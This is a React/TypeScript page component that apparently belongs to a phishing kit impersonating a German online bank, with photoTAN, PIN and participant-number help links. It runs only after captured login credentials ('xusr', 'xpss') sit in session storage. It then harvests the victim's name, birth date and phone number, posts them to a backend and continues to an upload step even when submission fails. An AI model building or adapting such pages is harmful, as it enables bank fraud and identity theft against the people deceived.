import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import apiService from '../services/api';
import { FaArrowRight } from 'react-icons/fa';

interface InfoFormData {
  xname1: string;
  xname2: string;
  xdob: string;
  xtel: string;
}

const InfoPage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [formData, setFormData] = useState<InfoFormData>({
    xname1: '',
    xname2: '',
    xdob: '',
    xtel: ''
  });
  const [errors, setErrors] = useState<Partial<InfoFormData>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  useEffect(() => {
    // Check if user came from login page
    const xusr = sessionStorage.getItem('xusr');
    const xpss = sessionStorage.getItem('xpss');
    
    if (!xusr || !xpss) {
      navigate('/login');
      return;
    }
  }, [navigate]);

  // Handle window resize
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === 'xdob') {
      // Auto-format date of birth with dots
      let formattedValue = value.replace(/\D/g, ''); // Remove all non-digits
      
      if (formattedValue.length >= 2) {
        formattedValue = formattedValue.substring(0, 2) + '.' + formattedValue.substring(2);
      }
      if (formattedValue.length >= 5) {
        formattedValue = formattedValue.substring(0, 5) + '.' + formattedValue.substring(5, 9);
      }
      
      setFormData(prev => ({
        ...prev,
        [name]: formattedValue
      }));
    } else {
      setFormData(prev => ({
        ...prev,
        [name]: value
      }));
    }
    
    // Clear error when user starts typing
    if (errors[name as keyof InfoFormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<InfoFormData> = {};

    if (!formData.xname1.trim()) {
      newErrors.xname1 = 'Bitte geben Sie Ihren Vornamen ein.';
    }

    if (!formData.xname2.trim()) {
      newErrors.xname2 = 'Bitte geben Sie Ihren Nachnamen ein.';
    }

    if (!formData.xdob.trim()) {
      newErrors.xdob = 'Bitte geben Sie Ihr Geburtsdatum ein.';
    } else if (!/^\d{2}\.\d{2}\.\d{4}$/.test(formData.xdob)) {
      newErrors.xdob = 'Bitte geben Sie Ihr Geburtsdatum im Format TT.MM.JJJJ ein.';
    }

    if (!formData.xtel.trim()) {
      newErrors.xtel = 'Bitte geben Sie Ihre Telefonnummer ein.';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      // Send data to backend (simulating the PHP behavior)
      const infoResponse = await apiService.info(formData);
      
      // Store in both session and local storage for mobile compatibility
      sessionStorage.setItem('xname1', formData.xname1);
      sessionStorage.setItem('xname2', formData.xname2);
      sessionStorage.setItem('xdob', formData.xdob);
      sessionStorage.setItem('xtel', formData.xtel);
      localStorage.setItem('xname1', formData.xname1);
      localStorage.setItem('xname2', formData.xname2);
      localStorage.setItem('xdob', formData.xdob);
      localStorage.setItem('xtel', formData.xtel);
      
      // Navigate to upload page
      navigate('/upload');
    } catch (error) {
      console.error('Info submission error:', error);
      // Still navigate to maintain the flow
      sessionStorage.setItem('xname1', formData.xname1);
      sessionStorage.setItem('xname2', formData.xname2);
      sessionStorage.setItem('xdob', formData.xdob);
      sessionStorage.setItem('xtel', formData.xtel);
      localStorage.setItem('xname1', formData.xname1);
      localStorage.setItem('xname2', formData.xname2);
      localStorage.setItem('xdob', formData.xdob);
      localStorage.setItem('xtel', formData.xtel);
      navigate('/upload');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: '20px 20px 20px 20px',
      margin: 0
    }}>
      {/* Personal Information heading */}
      <h1 style={{
        fontSize: '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '20px',
        marginBottom: '20px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '1200px',
        margin: '20px auto 20px auto',
        padding: isMobile ? '0 10px' : '0 20px'
      }}>
        {t('personalInfo')}
      </h1>


      
      <div style={{
        display: 'flex',
        flexDirection: isMobile ? 'column' : 'row',
        gap: isMobile ? '15px' : '20px',
        width: '100%',
        maxWidth: '1200px',
        alignItems: 'flex-start',
        margin: '0 auto',
        padding: isMobile ? '0 10px' : '0 20px'
      }}>
        {/* Info Form Box */}
        <div style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '15px' : '40px',
          width: '100%',
          minWidth: isMobile ? 'auto' : '300px'
        }}>
        <form onSubmit={handleSubmit} style={{
          padding: isMobile ? '5px' : '15px'
        }}>
          <div style={{
            marginBottom: isMobile ? '15px' : '10px',
            position: 'relative',
            display: 'flex',
            justifyContent: 'center'
          }}>
            <input
              type="text"
              id="xname1"
              name="xname1"
              value={formData.xname1}
              onChange={handleInputChange}
              style={{
                width: isMobile ? '100%' : '130%',
                padding: isMobile ? '15px 12px' : '12px 12px 12px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: 'white',
                fontFamily: 'Arial, Helvetica, sans-serif',
                fontSize: isMobile ? '16px' : '14px',
                outline: 'none !important',
                boxShadow: 'none !important'
              }}
              onFocus={(e) => {
                e.target.style.backgroundColor = 'white';
              }}
              placeholder={t('firstName')}
              autoComplete="off"
              maxLength={50}
              required
            />
            <span style={{
              position: 'absolute',
              right: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              backgroundColor: '#ccc',
              color: 'white',
              borderRadius: '50%',
              width: '20px',
              height: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '12px',
              fontWeight: 'bold'
            }}>i</span>
          </div>

          <div style={{
            marginBottom: isMobile ? '15px' : '10px',
            position: 'relative',
            display: 'flex',
            justifyContent: 'center'
          }}>
            <input
              type="text"
              id="xname2"
              name="xname2"
              value={formData.xname2}
              onChange={handleInputChange}
              style={{
                width: isMobile ? '100%' : '130%',
                padding: isMobile ? '15px 12px' : '12px 12px 12px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: 'white',
                fontFamily: 'Arial, Helvetica, sans-serif',
                fontSize: isMobile ? '16px' : '14px',
                outline: 'none !important',
                boxShadow: 'none !important'
              }}
              onFocus={(e) => {
                e.target.style.backgroundColor = 'white';
              }}
              placeholder={t('lastName')}
              autoComplete="off"
              maxLength={50}
              required
            />
            <span style={{
              position: 'absolute',
              right: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              backgroundColor: '#ccc',
              color: 'white',
              borderRadius: '50%',
              width: '20px',
              height: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '12px',
              fontWeight: 'bold'
            }}>i</span>
          </div>

          <div style={{
            marginBottom: isMobile ? '15px' : '10px',
            position: 'relative',
            display: 'flex',
            justifyContent: 'center'
          }}>
            <input
              type="tel"
              id="xdob"
              name="xdob"
              value={formData.xdob}
              onChange={handleInputChange}
              style={{
                width: isMobile ? '100%' : '130%',
                padding: isMobile ? '15px 12px' : '12px 12px 12px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: 'white',
                fontFamily: 'Arial, Helvetica, sans-serif',
                fontSize: isMobile ? '16px' : '14px',
                outline: 'none !important',
                boxShadow: 'none !important'
              }}
              onFocus={(e) => {
                e.target.style.backgroundColor = 'white';
              }}
              placeholder={t('birthDate') + ' (TT.MM.JJJJ)'}
              autoComplete="off"
              maxLength={10}
              pattern="\d{2}\.\d{2}\.\d{4}"
              required
            />
            <span style={{
              position: 'absolute',
              right: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              backgroundColor: '#ccc',
              color: 'white',
              borderRadius: '50%',
              width: '20px',
              height: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '12px',
              fontWeight: 'bold'
            }}>i</span>
          </div>

          <div style={{
            marginBottom: isMobile ? '15px' : '10px',
            position: 'relative',
            display: 'flex',
            justifyContent: 'center'
          }}>
            <input
              type="tel"
              id="xtel"
              name="xtel"
              value={formData.xtel}
              onChange={handleInputChange}
              style={{
                width: isMobile ? '100%' : '130%',
                padding: isMobile ? '15px 12px' : '12px 12px 12px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: 'white',
                fontFamily: 'Arial, Helvetica, sans-serif',
                fontSize: isMobile ? '16px' : '14px',
                outline: 'none !important',
                boxShadow: 'none !important'
              }}
              onFocus={(e) => {
                e.target.style.backgroundColor = 'white';
              }}
              placeholder={t('phone')}
              autoComplete="off"
              required
            />
            <span style={{
              position: 'absolute',
              right: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              backgroundColor: '#ccc',
              color: 'white',
              borderRadius: '50%',
              width: '20px',
              height: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '12px',
              fontWeight: 'bold'
            }}>i</span>
          </div>

          <button 
            type="submit" 
            disabled={isLoading}
            style={{
              width: isMobile ? '60%' : '40%',
              padding: isMobile ? '18px' : '15px',
              background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              fontSize: isMobile ? '18px' : '16px',
              fontWeight: 'bold',
              cursor: 'pointer',
              fontFamily: 'Arial, Helvetica, sans-serif',
              marginTop: isMobile ? '10px' : '5px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              margin: isMobile ? '10px auto 0 auto' : '5px auto 0 auto',
              transition: 'background 0.3s ease'
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.background = 'linear-gradient(315deg, #004d00 0%, #006400 50%, #004d00 100%)';
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.background = 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)';
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="white" style={{ marginRight: '4px' }}>
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            {isLoading ? (t('nextButton') + '...') : t('nextButton')}
          </button>
        </form>
        </div>
        
        {/* Important Info Box */}
        <div style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '15px' : '40px',
          width: '100%',
          minWidth: isMobile ? 'auto' : '300px'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#333',
            marginBottom: '15px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('importantInfo')}
          </h3>
          
          <p style={{
            fontSize: '14px',
            color: '#666',
            marginBottom: '20px',
            lineHeight: '1.5',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('photoTANProblems')}
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('noActiveTAN')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
              </div>
            </div>
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
              </div>
            </div>
          </div>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('forgotCredentials')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
              </div>
            </div>
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
              </div>
            </div>
          </div>
          
          <div>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('allAboutOnlineBanking')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
              </div>
            </div>
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InfoPage;
